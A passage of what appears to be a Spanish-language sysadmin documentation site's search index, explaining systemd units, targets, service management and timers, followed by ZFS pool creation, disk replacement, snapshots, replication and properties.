hijo, que se convierte en el proceso principal. oneshot . El proceso termina antes de comenzar con las siguientes unidades. dbus . Las siguientes unidades empezar\u00e1n cuando el proceso principal tegan el D-Bus. notify . En este caso depende de un mensaje de notificaci\u00f3n enviado por sd_notify . idle . La ejecuci\u00f3n del servicio se retrasa hasta que todos los trabajos han terminado. Restart Restart=always reinicia el servicio si se cae Restart=on-failure reinicia el servicio si se a parado por error. Restartsec Tiempo que tardara en reiniciar el servicio, por defecto es 100ms. StartLimitBurst y StartLimitIntervalSec definen los intentos de arranques del servicio y en que intervalo. StartLimitIntervalSec=0 reiniciar el servicio tantas veces como sea necesario. WantedBy runlevel en el que se debe iniciar el servicio. systemctl get-default # ver target por defecto 8 normalmente el grafico ) systemctl list-units --type target # lista de targets Timer Timer es una funcionalidad de systemd para automatizar servicios en fechas concretas, similar a cron pero con systemd. Consiste en crear un servicio.timer que contiene cuando debe ejecutarse y ejecuta otro servicio. Ejemplo: /usr/lib/systemd/system/backup.service [ Unit ] Description = Backup of my apache website [ Service ] Type = simple ExecStart = /var/www/backup/backup.sh [ Install ] WantedBy = multi-user.target /usr/lib/systemd/system/backup.timer [ Unit ] Description = Execute backup every day at midnight [ Timer ] OnCalendar = *-*-* 00 :00:00 Unit = backup.service [ Install ] WantedBy = multi-user.target As\u00ed de f\u00e1cil indicas hora y fecha a ejecutar, servicio y nivel de ejecuci\u00f3n. Sintaxis fechas El formato de la fecha es DiaDeLaSemana A\u00f1o-Mes-D\u00eda Hora:Minuto:Segundo . Se puede utilizar, * para indicar cualquier valor valores separados por comas para indicar un listado de posibles .. para indicar un rango continuo de valores / seguido por un valor. Esto indica que se ejecutar\u00e1 en ese valor y en los m\u00faltiplos correspondientes. As\u00ed *:0/10 indica que se ejecutar\u00e1 cada 10 minutos. Algunos ejemplos, OnCalendar=Mon,Tue *-*-01..04 12:00:00 indica que se ejecutar\u00e1 los cuatro primeros d\u00edas de cada mes las 12 horas siempre y cuando sea lunes o martes. OnCalendar=*-*-* 20:00:00 se ejecutar\u00e1 todos los d\u00edas a las 20 horas. OnCalendar=Mon..Fri *-*-* 20:00:00 se ejecutar\u00e1 de lunes a vierne a las 20 horas. OnCalendar=*-*-* *:0/15 o OnCalendar=*:0/15 se ejecutar\u00e1 cada 15 minutos Minimal form Normalized form Sat,Thu,Mon-Wed,Sat-Sun ==> Mon-Thu,Sat,Sun *-*-* 00:00:00 Mon,Sun 12-*-* 2,1:23 ==> Mon,Sun 2012-*-* 01,02:23:00 Wed *-1 ==> Wed *-*-01 00:00:00 Wed-Wed,Wed *-1 ==> Wed *-*-01 00:00:00 Wed, 17:48 ==> Wed *-*-* 17:48:00 Wed-Sat,Tue 12-10-15 1:2:3 ==> Tue-Sat 2012-10-15 01:02:03 *-*-7 0:0:0 ==> *-*-07 00:00:00 10-15 ==> *-10-15 00:00:00 monday *-12-* 17:00 ==> Mon *-12-* 17:00:00 Mon,Fri *-*-3,1,2 *:30:45 ==> Mon,Fri *-*-01,02,03 *:30:45 12,14,13,12:20,10,30 ==> *-*-* 12,13,14:10,20,30:00 mon,fri *-1/2-1,3 *:30:45 ==> Mon,Fri *-01/2-01,03 *:30:45 03-05 08:05:40 ==> *-03-05 08:05:40 08:05:40 ==> *-*-* 08:05:40 05:40 ==> *-*-* 05:40:00 Sat,Sun 12-05 08:05:40 ==> Sat,Sun *-12-05 08:05:40 Sat,Sun 08:05:40 ==> Sat,Sun *-*-* 08:05:40 2003-03-05 05:40 ==> 2003-03-05 05:40:00 2003-03-05 ==> 2003-03-05 00:00:00 03-05 ==> *-03-05 00:00:00 minutely ==> *-*-* *:*:00 hourly ==> *-*-* *:00:00 daily ==> *-*-* 00:00:00 monthly ==> *-*-01 00:00:00 weekly ==> Mon *-*-* 00:00:00 yearly ==> *-01-01 00:00:00 quarterly ==> *-01,04,07,10-01 00:00:00 semiannually ==> *-01,07-01 00:00:00 *:0/15 ==> *-*-* *:0/15 Por ultimo activarlo. sudo systemctl enable backup.timer sudo systemctl start backup.timer Reeditar si despu\u00e9s editas el timer y cambias la fecha hay que recargar el servicio. sudo systemctl daemon-reload Listar Timers sudo systemctl list-timers M\u00e1s informaci\u00f3n https://wiki.archlinux.org/index.php/Systemd https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/sect-managing_services_with_systemd-services https://www.atareao.es/tutorial/trabajando-con-systemd/ https://www.certdepot.net/rhel7-use-systemd-timers/","title":"Systemd"},{"location":"sistemas/Systemd/#systemd","text":"Systemd es la actualizaci\u00f3n de init, este proceso se encarga de arrancar todos los servicios, targets y componentes necesarios para poder trabajar con la terminal. La mejora de systemd respecto a init es que en el arranque del sistema inicia todos los demonios a la vez y trabajan en paralelo, a esto se le denomina ( concurrencia ). system-analyze blame # analizar tiempos de arranque systemd-analyze dot \"basic.target\" | dot -Tsvg > /tmp/basic.svg grafico de dependencias systemd-analyze dot \"basic.target\" | dot -Tsvg > /tmp/basic.svg systemd-analyze dot --to-pattern = \"*.target\" --from-pattern = \"httpd.service\" | dot -Tsvg > /tmp/gpm.svg","title":"Systemd"},{"location":"sistemas/Systemd/#units","text":"Systemd se configura exclusivamente a trabes de archivos de texto, registra las instrucciones de inicializaci\u00f3n para cada daemon en un archivo de configuraci\u00f3n (conocido como 'unit file'). Estos ficheros de configuraci\u00f3n se encuentran en: Redhad y derivados: /usr/lib/systemd/system/ Debian: /lib/systemd/system/ Algunos tipos de units: .service .target .socket .mount .automount .path .slice .timer Informaci\u00f3n sobre los units systyemctl list-units systemctl list-unit-files El contenido de estos archivos unit tienen una estructura simple, una descripci\u00f3n, que ejecutar, antes o despu\u00e9s de quien voy si es que dependen de alg\u00fan otro demonio es lo mas b\u00e1sico.","title":"Units"},{"location":"sistemas/Systemd/#niveles-de-arranque","text":"unit systemd Description 0 runlevel0.target , poweroff.target apagar sistema 1 runlevel1.target , rescue.target Modo rescate 2 runlevel2.target multi-user.target rescat con red 3 runlevel3.target , multi-user.target Multi usuario sin grafico 4 runlevel4.target multi-user.target custom 5 runlevel5.target , graphical.target Multi usuario con grafico 6 runlevel6.target , reboot.target apagar y reiniciar sistema init=/bin/bash emergency.target shell root Por defecto en una m\u00e1quina de usuario la opci\u00f3n esta indicada en graphical.target , lo podemos mirar con. La opci\u00f3n init=/bin/bash y emergency.target no son quivalentes ya que emergenci arranca systemd y init solo arranca el kernel y el bash. debian \u279c systemctl get-default graphical.target # modificar la opcion por defecto systemctl set-default multi-user.target # cambiar al modo rescue systemctl isolated rescue.target Todos estos target u objetivos, dependen de diferentes units para su ejecuci\u00f3n completa. Para alcanzar el objetivo x hay que arrancar primero n units que son sus dependencias. systemctl list-dependencies multi-user.target El directorio targe.wants es el que define la estructura del arranque, es decir para arrancar multi-user tienes que arrancar primero todos los units incluidos en el directorio multi-user.target.wants . ls /etc/systemd/system/multi-user.target.wants/ abrtd.service abrt-journal-core.service abrt-oops.service abrt-vmcore.service abrt-xorg.service atd.service auditd.service avahi-daemon.service chronyd.service crond.service cups.path dbxtool.service gpm.service libvirtd.service mcelog.service mdmonitor.service ModemManager.service NetworkManager.service nfs-client.target postgresql.service remote-fs.target rngd.service sssd.service vmtoolsd.service Son demonios a arrancar en ese target, todos estos archivos que se ven son enlaces simb\u00f3licos a /usr/lib/systemd/system/ , que es realmente donde se encuentra el demonio.","title":"Niveles de arranque"},{"location":"sistemas/Systemd/#demonios","text":"Los demonios ( servicios ) son programas tipo especial de proceso no interactivo, es decir, que se ejecuta en segundo plano. Actualmente los demonios se gestionan con systemctl podemos ver si un demonio esta activo o no con is-active o si esta habilitado con is-enable . systemctl is-active httpd Al instalar un demonio crea un archivo unit .service dentro de /usr/lib/systemd/system/ ,en el archivo de configuraci\u00f3n .service la opci\u00f3n wantedby indica en que objetivo se a\u00f1adir\u00e1 al habilitarlo.","title":"Demonios"},{"location":"sistemas/Systemd/#archivo-de-servicio","text":"El archivo de configuraci\u00f3n de un demonio denominado unit file con extensi\u00f3n .service . archivo b\u00e1sico: [ Unit ] Description = Descripcion corta del programa [ Service ] ExecStart = binario o script que ejecuta PidFile = escrivir un pid para dominarlo [ install ] WantedBy = donde instalarse multi-user.target, rescue.target etc.. Existen muchas opciones para este tipo de archivos por ejemplo: ExecStop : que quieres que haga al apagar el servicio. RemainAfterExit=true : una vez ejecutado muestra que esta activo ( esto sirve para ejecuciones que no son continuas ) Type=oneshot : se ejecuta solo una vez Cada vez que modifiquemos alg\u00fan servicio, objetivo o archivo unit es muy recomendable ejecutar systemctl daemon-reload para asegurarse que lee correctamente los demonios.","title":"Archivo de servicio"},{"location":"sistemas/Systemd/#targets","text":"Targets son los objetivos que se marca el arranque en el inicio del sistema. Los target guardan su configuraci\u00f3n en /usr/lib/systemd/system/ en archivos .target y la lista de unitsa arrancar en ese objetivo se guarda en /etc/systemd/system/objetivo.target.wants/ . Ejemplo configuraci\u00f3n. [ Unit ] Description = Rescue Mode Documentation = man:systemd.special ( 7 ) Requires = sysinit.target rescue.service After = sysinit.target rescue.service AllowIsolate = yes [ Install ] Alias = kbrequest.target Requires : exige que las opciones indicadas est\u00e9n activas para iniciarse After : me tengo que arrancar despu\u00e9s de las opciones dadas allowisolate : yes, indica si es un punto de sesi\u00f3n, es decir asociado a un target indica al sistema que una vez llegado a este objetivo puede ofrecer una sesi\u00f3n de usuario.","title":"Targets"},{"location":"sistemas/Systemd/#analizar-el-estado-del-sistema","text":"Para mostrar el estado del sistema utilice: systemctl status Para listar unidades en ejecuci\u00f3n : systemctl o: systemctl list-units Para listar unidades que han fallado : systemctl --failed Los archivos de las unidades disponibles se pueden ver en /usr/lib/systemd/system/ y /etc/systemd/system/ (este \u00faltimo tiene prioridad). Puede ver un listado de las unidades instaladas con: systemctl list-unit-files","title":"Analizar el estado del sistema"},{"location":"sistemas/Systemd/#gestionar-la-energia","text":"polkit es necesario para gestionar la energ\u00eda. Si se encuentra en una sesi\u00f3n local de systemd-logind y ninguna otra sesi\u00f3n est\u00e1 activa, las \u00f3rdenes siguientes funcionar\u00e1n sin requerir privilegios de root. Si no es as\u00ed (por ejemplo, debido a que otro usuario ha iniciado otra sesi\u00f3n tty), systemd autom\u00e1ticamente le requerir\u00e1 la contrase\u00f1a de root. Apagado y reinicio del sistema: $ systemctl reboot Apagado del sistema: $ systemctl poweroff Suspensi\u00f3n del sistema: $ systemctl suspend Poner el sistema en hibernaci\u00f3n: $ systemctl hibernate Poner el sistema en estado de reposo h\u00edbrido \u2014 \u00abhybrid-sleep\u00bb \u2014 (o suspensi\u00f3n combinada \u2014 \u00absuspend-to-both\u00bb \u2014): $ systemctl hybrid-sleep","title":"Gestionar la energ\u00eda"},{"location":"sistemas/Systemd/#gestion-servicios","text":"Systemd es la actualizaci\u00f3n de init, en la siguiente tabla muestro sus equivalencias. Init Systemd Description service name start systemctl start name.service Inicia un servicio service name stop systemctl stop name.service Detiene un servicio service name restart systemctl restart name.service Reinicia un servicio service name condrestart systemctl try-restart name.service Reinicia un servicio solo si est\u00e1 en funcionamiento service name reload systemctl reload name.service Recarga la configuraci\u00f3n de un servcio service name status systemctl status name.service systemctl is-active name.service Comprueba si un servicio est\u00e1 funcionando. service \u2013status-all systemctl list-units type service all Muestra el estado de todos los servicios. chkconfig name on systemctl enable name.service Habilita un servicio chkconfig name off systemctl disable name.service Deshabilita un servicio chkconfig \u2013list name systemctl status name.service systemctl is-enabled name.service Comprueba si un servici\u00f3n est\u00e1 habilitado chkconfig \u2013list systemctl list-unit-files \u2013type service Lista todos los servicios y comprueba si est\u00e1n habilitados chkconfig \u2013list systemctl list-dependencies \u2013after Lista los servicios que tienen que iniciarse antes de una unidad chkconfig \u2013list systemctl list-dependencies \u2013before Lista los servicios que tienen que iniciarse despu\u00e9s de una unidad","title":"Gesti\u00f3n servicios"},{"location":"sistemas/Systemd/#activar-habilitar-y-enmascarar","text":"","title":"Activar, Habilitar y Enmascarar"},{"location":"sistemas/Systemd/#activar","text":"Ver, activar, desactivar, recargar o mirar si esta activo: sudo systemctl status servicio sudo systemctl is-active servicio sudo systemctl start servicio sudo systemctl stop servicio sudo systemctl restart servicio sudo systemctl try-restart servicio # solo activa el servicio si anteriormente estaba activo sudo systemctl reload servicio # recarga la configuraci\u00f3n sin reiniciarse","title":"Activar"},{"location":"sistemas/Systemd/#habilitar","text":"sudo systemctl is-enabled servicio sudo systemctl enable servicio sudo systemctl disable servicio","title":"Habilitar"},{"location":"sistemas/Systemd/#enmascarar","text":"Un servicio est\u00e1 enmascarado cuando no se puede iniciar de forma manual o por medio de otro servicio. Por supuesto, cuando un servicio est\u00e1 enmascarado no puede ser iniciado en el arranque de la m\u00e1quina. Es decir, un servicio enmascarado puede estar activo, pero no puede estar habilitado. Ahora bien, si el servicio no est\u00e1 activo y est\u00e1 enmascarado, no se podr\u00e1 iniciar. Para ver si un servicio esta enmascarado no hay ning\u00fan comando, as\u00ed que habr\u00e1 que tirar de bash. ans = ` systemctl status ntp | grep masked ` ; if [ ${# ans } -gt 0 ] ; then echo \"masked\" ; else echo \"Not masked\" ; fi sudo systemctl mask servicio # enmascarar sudo systemctl unmask servicio # desenmascarar","title":"Enmascarar"},{"location":"sistemas/Systemd/#crear-un-servicio","text":"Servicio simple, se ejecuta una vez al iniciar el sistema. /lib/systemd/system/test.service [ Unit ] Description = Una prueba [ Service ] Type = oneshotExecStart = /bin/bash /home/lorenzo/test.sh /lib/systemd/system/backup.service [ Unit ] Description = Backup of my apache website [ Service ] Type = simple ExecStart = /var/www/backup/backup.sh [ Install ] WantedBy = multi-user.target Ahora simulamos que nuestro servicio arranca una api /lib/systemd/system/sample.service [ Unit ] Description = Ejemplo After = network.target StartLimitIntervalSec = 0 [ Service ] Type = simple Restart = always RestartSec = 1 User = lorenzo ExecStart = /usr/bin/env python3 /home/lorenzo/temporal/sample/sample.py [ Install ] WantedBy = multi-user.target Descripcion la descripci\u00f3n del servicio After tiene que esperarse a que el servicio indicado se haya iniciado. ExecStart ruta del ejecutable Type permite configurar el inicio del ejecutable. simple . El proceso empieza con ExecStart y es el principal proceso del servicio. forking . En este caso se lanza un proceso hijo, que se convierte en el proceso principal. oneshot . El proceso termina antes de comenzar con las siguientes unidades. dbus . Las siguientes unidades empezar\u00e1n cuando el proceso principal tegan el D-Bus. notify . En este caso depende de un mensaje de notificaci\u00f3n enviado por sd_notify . idle . La ejecuci\u00f3n del servicio se retrasa hasta que todos los trabajos han terminado. Restart Restart=always reinicia el servicio si se cae Restart=on-failure reinicia el servicio si se a parado por error. Restartsec Tiempo que tardara en reiniciar el servicio, por defecto es 100ms. StartLimitBurst y StartLimitIntervalSec definen los intentos de arranques del servicio y en que intervalo. StartLimitIntervalSec=0 reiniciar el servicio tantas veces como sea necesario. WantedBy runlevel en el que se debe iniciar el servicio. systemctl get-default # ver target por defecto 8 normalmente el grafico ) systemctl list-units --type target # lista de targets","title":"Crear un servicio"},{"location":"sistemas/Systemd/#timer","text":"Timer es una funcionalidad de systemd para automatizar servicios en fechas concretas, similar a cron pero con systemd. Consiste en crear un servicio.timer que contiene cuando debe ejecutarse y ejecuta otro servicio. Ejemplo: /usr/lib/systemd/system/backup.service [ Unit ] Description = Backup of my apache website [ Service ] Type = simple ExecStart = /var/www/backup/backup.sh [ Install ] WantedBy = multi-user.target /usr/lib/systemd/system/backup.timer [ Unit ] Description = Execute backup every day at midnight [ Timer ] OnCalendar = *-*-* 00 :00:00 Unit = backup.service [ Install ] WantedBy = multi-user.target As\u00ed de f\u00e1cil indicas hora y fecha a ejecutar, servicio y nivel de ejecuci\u00f3n.","title":"Timer"},{"location":"sistemas/Systemd/#sintaxis-fechas","text":"El formato de la fecha es DiaDeLaSemana A\u00f1o-Mes-D\u00eda Hora:Minuto:Segundo . Se puede utilizar, * para indicar cualquier valor valores separados por comas para indicar un listado de posibles .. para indicar un rango continuo de valores / seguido por un valor. Esto indica que se ejecutar\u00e1 en ese valor y en los m\u00faltiplos correspondientes. As\u00ed *:0/10 indica que se ejecutar\u00e1 cada 10 minutos. Algunos ejemplos, OnCalendar=Mon,Tue *-*-01..04 12:00:00 indica que se ejecutar\u00e1 los cuatro primeros d\u00edas de cada mes las 12 horas siempre y cuando sea lunes o martes. OnCalendar=*-*-* 20:00:00 se ejecutar\u00e1 todos los d\u00edas a las 20 horas. OnCalendar=Mon..Fri *-*-* 20:00:00 se ejecutar\u00e1 de lunes a vierne a las 20 horas. OnCalendar=*-*-* *:0/15 o OnCalendar=*:0/15 se ejecutar\u00e1 cada 15 minutos Minimal form Normalized form Sat,Thu,Mon-Wed,Sat-Sun ==> Mon-Thu,Sat,Sun *-*-* 00:00:00 Mon,Sun 12-*-* 2,1:23 ==> Mon,Sun 2012-*-* 01,02:23:00 Wed *-1 ==> Wed *-*-01 00:00:00 Wed-Wed,Wed *-1 ==> Wed *-*-01 00:00:00 Wed, 17:48 ==> Wed *-*-* 17:48:00 Wed-Sat,Tue 12-10-15 1:2:3 ==> Tue-Sat 2012-10-15 01:02:03 *-*-7 0:0:0 ==> *-*-07 00:00:00 10-15 ==> *-10-15 00:00:00 monday *-12-* 17:00 ==> Mon *-12-* 17:00:00 Mon,Fri *-*-3,1,2 *:30:45 ==> Mon,Fri *-*-01,02,03 *:30:45 12,14,13,12:20,10,30 ==> *-*-* 12,13,14:10,20,30:00 mon,fri *-1/2-1,3 *:30:45 ==> Mon,Fri *-01/2-01,03 *:30:45 03-05 08:05:40 ==> *-03-05 08:05:40 08:05:40 ==> *-*-* 08:05:40 05:40 ==> *-*-* 05:40:00 Sat,Sun 12-05 08:05:40 ==> Sat,Sun *-12-05 08:05:40 Sat,Sun 08:05:40 ==> Sat,Sun *-*-* 08:05:40 2003-03-05 05:40 ==> 2003-03-05 05:40:00 2003-03-05 ==> 2003-03-05 00:00:00 03-05 ==> *-03-05 00:00:00 minutely ==> *-*-* *:*:00 hourly ==> *-*-* *:00:00 daily ==> *-*-* 00:00:00 monthly ==> *-*-01 00:00:00 weekly ==> Mon *-*-* 00:00:00 yearly ==> *-01-01 00:00:00 quarterly ==> *-01,04,07,10-01 00:00:00 semiannually ==> *-01,07-01 00:00:00 *:0/15 ==> *-*-* *:0/15 Por ultimo activarlo. sudo systemctl enable backup.timer sudo systemctl start backup.timer","title":"Sintaxis fechas"},{"location":"sistemas/Systemd/#reeditar","text":"si despu\u00e9s editas el timer y cambias la fecha hay que recargar el servicio. sudo systemctl daemon-reload","title":"Reeditar"},{"location":"sistemas/Systemd/#listar-timers","text":"sudo systemctl list-timers","title":"Listar Timers"},{"location":"sistemas/Systemd/#mas-informacion","text":"https://wiki.archlinux.org/index.php/Systemd https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/sect-managing_services_with_systemd-services https://www.atareao.es/tutorial/trabajando-con-systemd/ https://www.certdepot.net/rhel7-use-systemd-timers/","title":"M\u00e1s informaci\u00f3n"},{"location":"sistemas/ZFS/","text":"ZFS Doc oracle zfs man zpool man zfs apt install zfsutils-linux zfs-dkms IMPORTANTE : No usar ZFS sobre controladoras hardware, puesto que tienen su propia cach\u00e9. ZFS necesita comunicarse directamente con los discos. Niveles de RAID soportados El sistema ZFS, soporta los siguientes tipos de RAID, los RAID-Z son una variacion de Raid5 RAID0 RAID1 RAID10 RAIDZ-1 (min 3 discos, paridad simple) RAIDZ-2 (min 4 discos, paridad doble) RAIDZ-3 (min 5 discos, paridad triple) Gesti\u00f3n de Zpools Visualizaci\u00f3n de zpool zpool status # ver estado el pool zpool list # ver la capacidad de los discos zfs list # ver los volumenes dentro de zpool zpool history # ver historial de comandos zpool get all # ver propiedades del pool Crear zpool doc oracle sobre esta secci\u00f3n RAID0 o \"Striping\" No a\u00f1ade redundancia, por lo que un fallo en un disco supone un fallo en el RAID completo. Sin embargo, si que mejora la velocidad de Lectura/Escritura. zpool create -f <NombrePool> <Disco> <Disco> [ <Disco> <Disco> <Disco> ... ] zpool create -f tank /dev/vdb /dev/vdc RAID1 o \"Mirroring\" Como m\u00ednimo necesitaremos 2 discos de la misma capacidad. La capacidad resultante ser\u00e1 la de un solo disco. zpool create -f <NombrePool> mirror <Disco1> <Disco2> zpool create -f tank mirror /dev/vdb /dev/vdc RAID10 El resultado ser\u00e1 un RAID0 sobre varios RAID1. Su capacidad ser\u00e1 la suma de capacidades de todos los RAID1 que lo compongan. zpool create -f <NombrePool> mirror <Disco1> <Disco2> mirror <Disco1> <Disco2> [ mirror <Disco1> <Disco2> ... ] zpool create -f tank mirror /dev/vdb /dev/vdc mirror /dev/vdd /dev/vde RAIDZ-1 El RAID-Z1, es similar a un RAID5 con paridad simple, requiere al menos 3 discos. zpool create -f <NombrePool> raidz1 <Disco1> <Disco2> <Disco3> zpool create -f tank raidz1 /dev/vdb /dev/vdc /dev/vdd RAIDZ-2 El RAID-Z2, es similar a un RAID5 con paridad doble, requiere al menos 4 discos. zpool create -f <NombrePool> raidz2 <Disco1> <Disco2> <Disco3> <Disco4> zpool create -f tank raidz2 /dev/vd[b-e] RAIDZ-3 El RAID-Z3, es similar a un RAID5 con paridad triple, requiere al menos 5 discos. zpool create -f <NombrePool> raidz3 <Disco1> <Disco2> <Disco3> <Disco4> <Disco5> zpool create -f tank raidz2 /dev/vd[b-f] Visualizar estato zpool status # ver estado el pool zpool list # ver la capacidad de los discos zfs list # ver los volumenes dentro de zpool zpool history # ver historial de comandos zpool get all # ver propiedades del pool Discos adicionales Disco de log Podemos a\u00f1adir un disco adicional para logs: zpool create -f <NombrePool> <ElRaidQueSea> log <Disco> # crear pool con disco de log zpool add -f <NombrePool> log <Disco> # a\u00f1adir disco cache de pool ya creado Disco cach\u00e9 Para acelerar la lectura y escritura en el RAID, podemos usar un disco cach\u00e9. Obviamente esto tiene sentido con discos SSD: zpool create -f <NombrePool> <ElRaidQueSea> cache <Disco> # crear pool con disco de cache zpool add -f <NombrePool> cache <Disco> # a\u00f1adir disco cache a pool ya creado Disco spare zpool create -f <NombrePool> <ElRaidQueSea> spare <Disco> # crear pool con disco de spare zpool add -f <NombrePool> spare <Disco> # a\u00f1adir disco spare a pool ya creado Quitar disco adicional zpool remove tank /dev/vdg # remove solo funciona con discos spare, cache, log, ... Modificar un Zpool A\u00f1adir/Quitar discos a mirror zpool create -f tank mirrot /dev/vdb /dev/vdc # creaci\u00f3n de mirror simple zpool status ... config: NAME STATE READ WRITE CKSUM tank ONLINE 0 0 0 mirror-0 ONLINE 0 0 0 vdb ONLINE 0 0 0 vdc ONLINE 0 0 0 zpool attach tank /dev/vdb /dev/vdd # a\u00f1adir disco a mirror zpool offline tank /dev/vdd # poner disco offline (simular un fallo) zpool detach tank /dev/vdd # retirar disco La opci\u00f3n attach no se puede utilizar directamente sobre raidz*, se tendr\u00e1 que utilizar replace cambio disco fallido n raidz con spare En este ejemplo se muestra como seria el cambio de un disco que a fallado en un raidz2 con spare zpool create -f tank raidz2 /dev/vd [ b-e ] spare /dev/vd [ fg ] # creaci\u00f3n de raidz2 con 2 discos spare zpool status NAME STATE READ WRITE CKSUM tank ONLINE 0 0 0 raidz2-0 ONLINE 0 0 0 vdb ONLINE 0 0 0 vdc ONLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 spares vdf AVAIL vdg AVAIL --- zpool offline tank vdc # simulo fallo de disco vdc zpool status NAME STATE READ WRITE CKSUM tank DEGRADED 0 0 0 raidz2-0 DEGRADED 0 0 0 vdb ONLINE 0 0 0 vdc OFFLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 spares vdg AVAIL vdf AVAIL --- zpool replace tank vdc vdf # remplazo disco vdc offline por vdf en spare zpool status NAME STATE READ WRITE CKSUM tank DEGRADED 0 0 0 raidz2-0 DEGRADED 0 0 0 vdb ONLINE 0 0 0 spare-1 DEGRADED 0 0 0 vdc OFFLINE 0 0 0 vdf ONLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 spares vdg AVAIL vdf INUSE currently in use --- zpool detach tank vdc # quito disco da\u00f1ado vdc zpool status NAME STATE READ WRITE CKSUM tank ONLINE 0 0 0 raidz2-0 ONLINE 0 0 0 vdb ONLINE 0 0 0 vdf ONLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 spares vdg AVAIL --- zpool add tank spare vdc # pongo vdc reparado como spare zpool status NAME STATE READ WRITE CKSUM tank ONLINE 0 0 0 raidz2-0 ONLINE 0 0 0 vdb ONLINE 0 0 0 vdf ONLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 spares vdg AVAIL vdc AVAIL Cambio de disco a raidz En este ejemplo se muestra el cambio de un disco en un raidz2 sin spare Primero de todo simulamos el fallo de un disco poniendolo offline zpool offline tank vdd zpool status NAME STATE READ WRITE CKSUM tank DEGRADED 0 0 0 raidz2-0 DEGRADED 0 0 0 vdb ONLINE 0 0 0 vdc ONLINE 0 0 0 vdd OFFLINE 0 0 0 vde ONLINE 0 0 0 vdf ONLINE 0 0 0 vdg ONLINE 0 0 0 En este paso ya podemos desmontar y retirar el disco de la m\u00e1quina y poner uno nuevo. Una vez insertado el disco nuevo en la m\u00e1quina con zpool replace lo volvemos a poner online en el pool zpool replace tank /dev/vdd zpool status NAME STATE READ WRITE CKSUM tank ONLINE 0 0 0 raidz2-0 ONLINE 0 0 0 vdb ONLINE 0 0 0 vdc ONLINE 0 0 0 vdd ONLINE 0 0 0 vde ONLINE 0 0 0 vdf ONLINE 0 0 0 vdg ONLINE 0 0 0 Aumentar/Reducir raidz Actualmente en la versio de OpenZFS 2.1 no se puede canviar el modo de raidz, aun que anuncian para 3.0 en 2022 esa funcionalidad. De momento solo podemos hacer un snapshot de los datos, destruir el el zpool, crear uno nuevo y volver a volcar el snapshot zfs snapshot tank/documents@backup zfs send -cpe tank/documents@backup > backup.documnts zpool destroy tank zpool create -f tank raidz2 /dev/vd [ b-g ] zfs recv tank/documents < backup.documnts zfs list NAME USED AVAIL REFER MOUNTPOINT tank 357K 7 .42G 44 .0K /tank tank/documents 90 .9K 7 .42G 90 .9K /tank/documents Migraci\u00f3n doc oracle sobre esta secci\u00f3n La opci\u00f3n export marca los discos como que se esta iniciando una migraci\u00f3n y entre otras cosas purga cualquier dato no escrito en el disco ( hace un sync) zpool export tank Una vez exportado el pool ya se pueden extraer los discos e llevarlos a otro nas Para detectar las agrupaciones disponibles, ejecute el comando zpool import sin opciones. Por ejemplo: zpool import # ver pools disponibles zpool import tank # importar pool tank (tambien se puede indicar con nel id) zpool import tank zelda # importar renombrando zfs set mountpoint = /zelda zelda # canviar punto de montaje podr\u00e1s ver el id de un pool con zpool status o zpool import Destrucci\u00f3n zpool destroy dozer # destruir un pool zpool import -D # ver pools destridos zpool import -Df dozer # forzar importci\u00f3n pool dozer zpool status -x # visualizar pool en mal estado pool: dozer state: DEGRADED status: One or more devices could not be opened. Sufficient replicas exist for the pool to continue functioning in a degraded state. action: Attach the missing device and online it using 'zpool online' . see: http://www.sun.com/msg/ZFS-8000-2Q scrub: scrub completed after 0h0m with 0 errors on Thu Jan 21 15 :38:48 2010 config: NAME STATE READ WRITE CKSUM dozer DEGRADED 0 0 0 raidz2-0 DEGRADED 0 0 0 c2t8d0 ONLINE 0 0 0 c2t9d0 ONLINE 0 0 0 c2t10d0 ONLINE 0 0 0 c2t11d0 UNAVAIL 0 37 0 cannot open c2t12d0 ONLINE 0 0 0 errors: No known data errors zpool online dozer c2t11d0 # reactivar disco Bringing device c2t11d0 online zpool status -x all pools are healthy A\u00f1adir notificaciones por e-Mail. Instalamos el servicio que se encargar\u00e1 de monitorizar los eventos del m\u00f3dulo de kernel ZFS. Este servicio puede enviar emails cuando ocurran errores en alguna pool. apt-get install zfs-zed Para activar el demonio, debemos configurar el correo: nano /etc/zfs/zed.d/zed.rc ZED_EMAIL_ADDR=\"avisos@correo.es\" Propiedades de un pool doc oracle sobre esta secci\u00f3n Definir tama\u00f1o de sector Para un comportamiento \u00f3ptimo de la unidad ZFS, el tama\u00f1o del sector de la Pool (ashift), debe ser mayor o igual que el tama\u00f1o del sector en los discos que la componen. Para configurarlo, lo har\u00edamos de la siguiente forma: zpool create -f -o ashift = 12 <NombrePool> <ElRaidQueSea> zpool create -f -m /tank tank /dev/vdb # crear volumenes -f force vdevs zpool scrub tank # a\u00f1adir control de fallos al volumen zpool history # ver historial de comandos Volumenes Crear volumen zfs create tank/documents zfs destroy tank/documents zfs create -o compression = on tank/documents Snapshot zfs snapshot tank/documents@backup zfs list -t snapshot ll /tank/documents/.zfs/snapshot/backup zfs rollback tank/documents@backup zfs destroy tank/documents@backup -n no-action -v verbose -r recursive ( clones... ) Enviar snapshot zfs send -cpev tank/dana@snap1 | ssh host2 zfs recv newtank/dana # enviar snap # -c compress # -p Informaci\u00f3n verbosa sobre el paquete de transmisi\u00f3n generado. # -e Generate a more compact stream # -v vervose zfs send -i tank/dana@snap1 tank/dana@snap2 | ssh host2 zfs recv -F newtank/dana # enviar icremental snap # -F forzar rollback a la instantanea mas reciente antes de recibir # enviar datast con todos los snapshots zfs send -R tank/dataset@snapMasReciente | ssh <ip> zfs recv tank/dataset Propiedades doc oracle sobre esta secci\u00f3n Se pueden ver todas las propiedades en man zfsprops zfs get all tank/documents # ver opciones zfs set compression = on tank/documents zfs set atime = off # Controla si el tiempo de acceso a los archivos se actualiza cuando se leen zfs set atime = off relatime = on zelda Una vez creada la unidad ZFS, es posible usar compresi\u00f3n en este almacenamiento zfs set compression = lz4 <NombrePool> zfs set compression = off <NombrePool> Se recomienda usar el algoritmo lz4, ya que agrega muy poca sobrecarga de CPU. Tambi\u00e9n est\u00e1n disponibles otros algoritmos como lzjb y gzip-N, donde N es un n\u00famero entero de 1 (m\u00e1s 